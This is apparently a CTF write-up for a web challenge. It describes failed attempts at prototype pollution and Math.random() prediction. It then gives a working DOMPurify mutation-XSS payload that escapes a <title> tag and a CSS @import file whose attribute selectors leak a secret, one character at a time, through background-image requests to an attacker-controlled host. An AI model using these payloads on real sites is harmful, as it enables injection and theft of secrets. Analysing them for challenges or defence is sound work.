## Fancy Text Viewer

This was actually a quite difficult challenge including a lot of different techniques that I've never heard of before.
However we were finally able to solve it after ~18 hours of banging our heads against it and still were able to score second blood on it, which I'm quite proud of.

### The first few hours

#### The cursed PP

The first few hours consisted of us banging our heads against the `toLowerCase`-Middleware because it seemingly allowed to inject something into the `__proto__` object. So the idea was to use this to
pollute the prototype object 

```js
app.use((req, res, next) => {
    for (const key in req.query) {
        let value = req.query[key];
        delete req.query[key];
        req.query[key.toLowerCase()] = value;
    }
    next();
});
```

However, instead of following the PP-primitive

```js
// we control a,b and c

var obj = {};
obj[a][b] = c
```

We only have the following. It looks similar but is not enough for PP:

```js
// we control a and b

var obj = {};
obj[a] = b
```

#### The you-have-thought-too-far-vector

At some point I googled to find out if `Math.random()` was cryptographically secure and it turns out it is not.
It has even been predictable to the point that you could reconstruct the seed and previous values given only a handful of values.
[This](https://github.com/d0nutptr/v8_rand_buster) github repo actually cracks random numbers generated by v8 that have been put through a function
such as `Math.floor(CONST * Math.random())`, which is exactly what we have in our app:

```js
function randomstring(length) {
    const chars =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function randomhexstring(length) {
    const chars = "0123456789abcdef";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}
```

As we have access to `randomhexstring`, because it is used as the colors in the css, I thought it should be possible to reconstruct the
admin password that is built before using the same function:

```js
const ADMIN_PASSWORD = randomstring(64);

app.get("/view", (req, res) => {
    const content = req.query.content;
    const clrs = [];
    for (let i = 0; i < 4; i++) {
        clrs.push("#" + randomhexstring(6));
    }
    res.render("view", { content, clrs });
});
```

I still feel robbed that this was not the solution - it would have been kind of neat. Apparently however, the `Math.random()` function has been improved to the point
to not be vulnerable to this attack anymore.

### The Tip

Finally a tip rolled in that talked about the `sharedby`-parameter in the  `/`-endpoint. It also said something about `CSS>XSS`. babba from our team gave out the hint that
it must be some kind of `CSS data exfiltration` in combination with `mXSS` (mutation XSS).

### The Solution

It became clear that we would need to send the bot to the `/`-endpoint and perform some kind of XSS on the `sharedby` parameter for reflected XSS.
Hoever, the sharedby parameter is only reflected inside of a `<title>`-tag, which puts the browser into a mode of interpreting the content as plain-text instead of html. 
The next few hours were dedicated to escaping the `<title>`-tag. The biggest problem was the regex that robbed us of the slash-symbol `/`.

```
function sanitize(str) {
    str = str.replace(/[^(0-Z. )]/g, "");
    return DOMPurify.sanitize(str);
}
```

A lot of trial and error later, I stumbled across [this](https://x.com/XssPayloads/status/1337275431645540352) twitter post. After playing around with it for a while, what stuck was:

```xml
<MATH><MTEXT><TABLE ID=2><TABLE><SVG><TITLE><MGLYPH><TABLE ID=BLABLI><STYLE>@IMPORT "URL(REDIRECT?URL=x.x.x.x)
```

`DOMPurify` would remove any `<script>`-tag you throw at it but allows for `<style>`-tags, we just needed a way to escape the `<title>`-tag jail. `DOMPurify` mutates our input (for example, it closes unclosed tags and sometimes shuffles around some of the tags). However, it also gets confused about the different namespaces like `<MATH>` and `<HTML>`, which is our chance here. By providing the payload as above, the `<table>` is moved into the `<body>`-tag, where the `<style>`-tag is actually applied as such. 

### The Exfiltration

The template for index.html contains the following snippet:

```html
<% if (flag) { %>
    <p>Oh? You seem to have a flag! You can view it <a href="view?content=<%- flag %>">here</a>!</p>
<% } %>
```

In order to steal the flag, we need to send the bot to `index.html` with our reflected html injection. Then, the import statement should load a `.css` file that we provide remotely.
That `.css` file in itself, loads a "background image" depending on the value it encounters in the flag. The following is a snippet from the served `.css` file:

```css
a[href^="view?content=0"]{
        background: url(http://x.x.x.x:30000/0);
    }
a[href^="view?content=1"]{
        background: url(http://x.x.x.x:30000/1);
    }
a[href^="view?content=2"]{
        background: url(http://x.x.x.x:30000/2);
    }
a[href^="view?content=3"]{
        background: url(http://x.x.x.x:30000/3);
    }
a[href^="view?content=4"]{
        background: url(http://x.x.x.x:30000/4);
    }
a[href^="view?content=5"]{
        background: url(http://x.x.x.x:30000/5);
    }
a[href^="view?content=6"]{
        background: url(http://x.x.x.x:30000/6);
    }
a[href^="view?content=7"]{
        background: url(http://x.x.x.x:30000/7);
    }
...
```

Some manual labor was necessary to continuously update the `.css` file and send the bot again. This could have been automated but I just did by hand instead.
So the payload finally, that we sent the bot to repeatedly was:

`http://127.0.0.1:4444/?sharedby=<MATH><MTEXT><TABLE ID=2><TABLE><SVG><TITLE><MGLYPH><TABLE ID=BLABLI><STYLE>@IMPORT "URL(REDIRECT?URL=x.x.x.x)"`


One last thing was that we couldn't import the url directly, because we didn't have a slash. This meant that we couldnt provide the `http://`-protocol identifier.
In order to circumvent this, we abused the `/redirect`-endpoint.